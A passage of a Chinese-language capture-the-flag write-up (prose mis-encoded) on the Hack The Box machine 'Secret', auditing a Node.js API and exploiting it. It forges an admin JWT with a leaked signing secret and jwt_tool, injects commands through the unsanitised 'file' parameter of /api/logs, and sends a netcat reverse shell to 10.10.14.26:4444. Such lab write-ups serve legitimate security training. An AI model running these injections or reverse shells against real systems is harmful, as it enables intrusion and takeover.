class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// validation</span></span><br><span class="line">    <span class="keyword">const</span> &#123; error &#125; = registerValidation(req.body)</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(error.details[<span class="number">0</span>].message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if user exists</span></span><br><span class="line">    <span class="keyword">const</span> emailExist = <span class="keyword">await</span> User.findOne(&#123;<span class="attr">email</span>:req.body.email&#125;)</span><br><span class="line">    <span class="keyword">if</span> (emailExist) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Email already Exist&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if user name exist </span></span><br><span class="line">    <span class="keyword">const</span> unameexist = <span class="keyword">await</span> User.findOne(&#123; <span class="attr">name</span>: req.body.name &#125;)</span><br><span class="line">    <span class="keyword">if</span> (unameexist) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Name already Exist&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hash the password</span></span><br><span class="line">    <span class="keyword">const</span> salt = <span class="keyword">await</span> bcrypt.genSalt(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">const</span> hashPaswrod = <span class="keyword">await</span> bcrypt.hash(req.body.password, salt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//create a user </span></span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">new</span> User(&#123;</span><br><span class="line">        name: req.body.name,</span><br><span class="line">        email: req.body.email,</span><br><span class="line">        password:hashPaswrod</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> saveduser = <span class="keyword">await</span> user.save();</span><br><span class="line">        res.send(&#123; <span class="attr">user</span>: user.name&#125;)</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// login </span></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span>  (req , res) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; error &#125; = loginValidation(req.body)</span><br><span class="line">    <span class="keyword">if</span> (error) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(error.details[<span class="number">0</span>].message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if email is okay </span></span><br><span class="line">    <span class="keyword">const</span> user = <span class="keyword">await</span> User.findOne(&#123; <span class="attr">email</span>: req.body.email &#125;)</span><br><span class="line">    <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Email is wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check password </span></span><br><span class="line">    <span class="keyword">const</span> validPass = <span class="keyword">await</span> bcrypt.compare(req.body.password, user.password)</span><br><span class="line">    <span class="keyword">if</span> (!validPass) <span class="keyword">return</span> res.status(<span class="number">400</span>).send(<span class="string">&#x27;Password is wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// create jwt </span></span><br><span class="line">    <span class="keyword">const</span> token = jwt.sign(&#123; <span class="attr">_id</span>: user.id, <span class="attr">name</span>: user.name , <span class="attr">email</span>: user.email&#125;, process.env.TOKEN_SECRET )</span><br><span class="line">    res.header(<span class="string">&#x27;auth-token&#x27;</span>, token).send(token);</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">        message: &#123;</span><br><span class="line"></span><br><span class="line">            message: <span class="string">&quot;404 page not found&quot;</span>,</span><br><span class="line">            desc: <span class="string">&quot;page you are looking for is not found. &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure>
<!--more-->

<p>çœ‹åˆ°æºä»£ç åï¼Œä¸éš¾ç†è§£å…¶é€»è¾‘ï¼Œç¨‹åºçš„é€»è¾‘å°±æ˜¯å…ˆè¦æ³¨å†Œç”¨æˆ·ï¼Œå¹¶æ£€æŸ¥é‚®ä»¶å’Œç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼Œå¹¶å°†å¯†ç è¿›è¡ŒåŠ å¯†ã€‚ç„¶åç¨‹åºè·³è½¬åˆ°ç™»å½•é¡µé¢ï¼Œç™»å½•é¡µé¢æŸ¥çœ‹ç”¨æˆ·è¾“å…¥çš„é‚®ä»¶åå’Œå¯†ç æ˜¯å¦æ­£ç¡®ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªjwtçš„tokenå€¼å‘é€ç»™ç”¨æˆ·ã€‚</p>
<p>auth.jsæ–‡ä»¶çš„é€»è¾‘ç†è§£å®Œä¹‹åï¼Œæˆ‘ä»¬å†å®¡è®¡<code>private.js</code>è¿™ä¸ªjsæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯å»åˆ¤æ–­æˆ‘ä»¬å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯ç®¡ç†å‘˜ï¼Œå¦‚æœæ˜¯ç®¡ç†å‘˜ï¼Œé‚£ä¹ˆå°±è¿”å›ä¸€ä¸ªå±äºç®¡ç†å‘˜çš„tokenå€¼ç»™æˆ‘ä»¬ã€‚logsç›®å½•çš„ä½œç”¨æˆ‘ä»¬åé¢åœ¨é˜è¿°ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>).Router();</span><br><span class="line"><span class="keyword">const</span> verifytoken = <span class="built_in">require</span>(<span class="string">&#x27;./verifytoken&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">&#x27;../model/user&#x27;</span>);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/priv&#x27;</span>, verifytoken, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   <span class="comment">// res.send(req.user)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> userinfo = &#123; <span class="attr">name</span>: req.user &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> name = userinfo.name.name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;theadmin&#x27;</span>)&#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            creds:&#123;</span><br><span class="line">                role:<span class="string">&quot;admin&quot;</span>, </span><br><span class="line">                username:<span class="string">&quot;theadmin&quot;</span>,</span><br><span class="line">                desc : <span class="string">&quot;welcome back admin,&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            role: &#123;</span><br><span class="line">                role: <span class="string">&quot;you are normal user&quot;</span>,</span><br><span class="line">                desc: userinfo.name.name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/logs&#x27;</span>, verifytoken, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> file = req.query.file;</span><br><span class="line">    <span class="keyword">const</span> userinfo = &#123; <span class="attr">name</span>: req.user &#125;</span><br><span class="line">    <span class="keyword">const</span> name = userinfo.name.name;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (name == <span class="string">&#x27;theadmin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> getLogs = <span class="string">`git log --oneline <span class="subst">$&#123;file&#125;</span>`</span>;</span><br><span class="line">        exec(getLogs, <span class="function">(<span class="params">err , output</span>) =&gt;</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                res.status(<span class="number">500</span>).send(err);</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            res.json(output);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        res.json(&#123;</span><br><span class="line">            role: &#123;</span><br><span class="line">                role: <span class="string">&quot;you are normal user&quot;</span>,</span><br><span class="line">                desc: userinfo.name.name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.json(&#123;</span><br><span class="line">        message: &#123;</span><br><span class="line"></span><br><span class="line">            message: <span class="string">&quot;404 page not found&quot;</span>,</span><br><span class="line">            desc: <span class="string">&quot;page you are looking for is not found. &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆè·Ÿç€ç¨‹åºçš„é€»è¾‘èµ°ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œæˆ‘ä»¬ä½¿ç”¨curlå‘½ä»¤è¿›è¡Œæ³¨å†Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -v http://secret.htb/api/user/register --data <span class="string">&#x27;&#123;&quot;name&quot;: &quot;pyhpyh&quot;,&quot;email&quot;:&quot;pyhpyh@pyhpyh.com&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/6877b34ccd48456899c6406694b4a3c1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨å†ŒæˆåŠŸåæˆ‘ä»¬å°è¯•ç™»å½•ï¼Œè·å–åˆ°å¯¹åº”çš„ä¸€ä¸ªjwtçš„jsonå€¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -v http://secret.htb/api/user/login --data <span class="string">&#x27;&#123;&quot;email&quot;: &quot;pyhpyh@pyhpyh.com&quot;,&quot;password&quot;:&quot;123456&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/aafa956f479941fbbeab98630d01d38f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬æ‹¿åˆ°<code>jwt.io</code>è¿™ä¸ªç½‘ç«™ä¸Šè¿›è¡Œè§£å¯†ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/179ef353a19343508cdd7f441865168d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä»¥è¿™ä¸ªtokenå€¼å»è¯·æ±‚<code>priv</code>é¡µé¢æ—¶ï¼Œé¡µé¢è¿”å›çš„æ˜¯jsonå†…å®¹ç»™æˆ‘ä»¬ï¼Œè¡¨åæˆ‘ä»¬å½“å‰è¿˜æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://secret.htb/api/priv -H <span class="string">&#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU1OTEwNTQ4OTBkMzA0NWZiZGVjZTkiLCJuYW1lIjoicHlocHloIiwiZW1haWwiOiJweWhweWhAcHlocHloLmNvbSIsImlhdCI6MTY0MjQzNDk3MX0.a0IawKMSfT6K0c3MnpLFUG9DdzBGETBaBidIVvI232k&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/4ffd7b07f06341bc9e474824e0ab7497.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬è¿™é‡Œå°±å¯ä»¥ä½¿ç”¨è¶Šæƒçš„æ–¹å¼è¿›è¡Œå¯¹æˆ‘ä»¬å½“å‰ç”¨æˆ·çš„æƒé™è¿›è¡Œæå‡ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆè·å–åˆ°ç½‘ç«™æœ¬èº«å¯¹åº”çš„<code>TOKEN_SECRET</code>å€¼<code>gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE</code><br><img src="https://img-blog.csdnimg.cn/fbbb692d50744c04b07e88f1794b5a28.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼å¯ä»¥è·å–åˆ°<code>theadmin</code>çš„tokenå€¼ï¼Œç¬¬ä¸€ç§æ–¹å¼æ˜¯ç›´æ¥åœ¨jwt.ioç½‘ç«™ä¸Šè·å–ï¼Œå¦ä¸€ç§æ˜¯å€ŸåŠ©githubä¸Šçš„å¼€æºå·¥å…·ï¼Œä¸¤ç§æ–¹æ³•éƒ½æ˜¯å¯è¡Œçš„ã€‚<br><img src="https://img-blog.csdnimg.cn/8d4fa1ca097b4af88ba2fa45fb58e16f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/7e6f80cc46fb4cd295778db414ecac66.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>tokenæ”¹å˜å®Œæˆåï¼Œæˆ‘ä»¬å†è¿›è¡Œè¯·æ±‚ï¼ŒéªŒè¯æˆ‘ä»¬çš„tokenæ˜¯å¦æœ‰æ•ˆï¼Œç»“æœæ˜¯æˆåŠŸçš„ã€‚<br><img src="https://img-blog.csdnimg.cn/a1f94aca92f3429c9a9f6a60702f9b5f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯ï¼Œåˆ©ç”¨jwt_toolsè¿™ä¸ªå·¥å…·ç›´æ¥ç”Ÿæˆä¸€ä¸ªæœ‰æ•ˆçš„theadminå¯¹åº”çš„tokenå€¼ã€‚<code>-I</code>å‚æ•°æ˜¯æŒ‡æ›´æ”¹ç°æœ‰çš„jwt_tokenå€¼ï¼Œ<code>-S</code>æ˜¯æŒ‡åŠ å¯†çš„æ–¹å¼ï¼Œ<code>-pc</code>æ˜¯è®¾ç½®payloadçš„å¯¹åº”å­—æ®µåï¼Œ<code>-pv</code>æ˜¯payloadå¯¹åº”çš„å­—æ®µå€¼ï¼Œ<code>-p</code>æ˜¯æŒ‡å¯†ç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 jwt_tool.py -I -S hs256 -pc <span class="string">&#x27;name&#x27;</span> -pv <span class="string">&#x27;theadmin&#x27;</span> -p <span class="string">&#x27;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#x27;</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoicHlocHloIiwiZW1haWwiOiJweWhweWhAcHlocHloLmNvbSIsImlhdCI6MTY0MjQ3NDY0Mn0.veoEcejKaj-TjQuBu63pwJmyaU1hzx3qV7GgQkbZ6R4</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/84147fa8af0e48feb62f092514fda485.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è‡³æ­¤ï¼Œæˆ‘ä»¬è™½ç„¶æ˜¯å¾—åˆ°äº†adminçš„tokenä»¤ç‰Œï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¾—æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚åœ¨å®¡è®¡private.jsæ–‡ä»¶æ—¶ï¼Œå‘ç°äº†logsç›®å½•ï¼Œè¿™ä¸ªç›®å½•åé¢è¦ä¼ å…¥ä¸€ä¸ªfileså‚æ•°ï¼Œè¿™ä¸ªå‚æ•°æ‰§è¡Œçš„æ¡ä»¶æ°å·§å°±æ˜¯å¿…é¡»å¾—ä»¥ç®¡ç†å‘˜çš„æƒé™è¿è¡Œï¼Œå¹¶ä¸”æ˜¯ä»¥å‘½ä»¤çš„å½¢å¼æ‰§è¡Œï¼Œé‚£è¿™é‡Œå°±å¯èƒ½å­˜åœ¨RCEæ¼æ´äº†ã€‚æˆ‘ä»¬ç®€å•æ£€éªŒäº†ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/3986f4c8d6c741c3a586b085150d2916.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://secret.htb/api/logs?file=/etc/passwd&#x27;</span> -H <span class="string">&#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2227afbf6fb649e681f1a9da5e9bd06c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»è¿™ä¸ªç°è±¡ä¸Šçœ‹ï¼Œæœ‰ç‚¹ç±»ä¼¼äºå‘½ä»¤æ³¨å…¥æ¼æ´ã€‚æˆ‘ä»¬ç¨å¾®æ›´æ”¹ä¸€ä¸‹å‚æ•°å˜é‡çš„å€¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://secret.htb/api/logs?file=;id&#x27;</span> -H <span class="string">&#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/39cd1b3ae0744ea783b6dfe4775a5e43.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬å°±å¯ä»¥åå¼¹ä¸€ä¸ªshellåˆ°æœ¬åœ°ç»ˆç«¯ä¸Šäº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%20%7C%20nc%2010.10.14.26%204444%20%3E%2Ftmp%2Ff&#x27;</span> -H <span class="string">&#x27;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWU2MmM4MjJiODI1ZTA0NmIwNzFiYTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InB5aHB5aEBweWhweWguY29tIiwiaWF0IjoxNjQyNDc0NjQyfQ.C-80kPcZ5PSO1qK-VNL1m4PACDJO8jJ-qPMrTp19u_A&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/91a92e66d3d8430b83ab8c3b7f961162.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/22ae641b17d34a9eaab0ac356d0e3032.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬é¦–å…ˆæŸ¥æ‰¾å…·æœ‰æ‰§è¡Œæƒé™çš„æ–‡ä»¶ï¼Œå¼•èµ·æˆ‘æ³¨æ„çš„æ˜¯<code>/opt/count</code>è¿™ä¸ªæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/e850dd03ff7d47fbb92504de53f3bfc7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥optç›®å½•åï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ª<code>code.c</code>æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/1148c32238e347d6a410e8666df9bb43.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dircount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *summary)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DIR *dir;</span><br><span class="line">    <span class="keyword">char</span> fullpath[PATH_MAX];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">ent</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fstat</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tot = <span class="number">0</span>, regular_files = <span class="number">0</span>, directories = <span class="number">0</span>, symlinks = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((dir = opendir(path)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUnable to open directory.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((ent = readdir(dir)) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ++tot;</span><br><span class="line">        <span class="built_in">strncpy</span>(fullpath, path, PATH_MAX-NAME_MAX<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(fullpath, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="built_in">strncat</span>(fullpath, ent-&gt;d_name, <span class="built_in">strlen</span>(ent-&gt;d_name));</span><br><span class="line">        <span class="keyword">if</span> (!lstat(fullpath, &amp;fstat))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(S_ISDIR(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">                ++directories;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(S_ISLNK(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;l&quot;</span>);</span><br><span class="line">                ++symlinks;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(S_ISREG(fstat.st_mode))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">                ++regular_files;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IRUSR) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWUSR) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXUSR) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IRGRP) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWGRP) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXGRP) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IROTH) ? <span class="string">&quot;r&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IWOTH) ? <span class="string">&quot;w&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span 